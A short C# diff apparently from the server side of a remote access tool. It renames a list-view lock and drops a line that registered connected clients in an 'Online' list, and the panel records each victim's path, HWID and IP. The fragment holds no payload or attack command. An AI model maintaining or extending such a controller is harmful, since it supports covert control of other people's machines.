@@ -34,7 +34,7 @@ namespace Server.Handle_Packet
                 client.LV.ToolTipText = "[Path] " + unpack_msgpack.ForcePathObject("Path").AsString + Environment.NewLine;
                 client.LV.ToolTipText += "[Pastebin] " + unpack_msgpack.ForcePathObject("Pastebin").AsString;
                 client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
-                lock (Settings.Listview1Lock)
+                lock (Settings.LockListviewClients)
                 {
                     Program.form1.listView1.Items.Add(client.LV);
                     Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
@@ -48,11 +48,6 @@ namespace Server.Handle_Packet
                 }
             }
             catch { }
-
-            lock (Settings.Online)
-            {
-                Settings.Online.Add(client);
-            }
             new HandleLogs().Addmsg($"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} connected successfully", Color.Green);
         }
 
@@ -60,7 +55,7 @@ namespace Server.Handle_Packet
         {
             try
             {
-                lock (Settings.Listview1Lock)
+                lock (Settings.LockListviewClients)
                     if (client != null && client.LV != null)
                         client.LV.ForeColor = Color.Empty;
             }
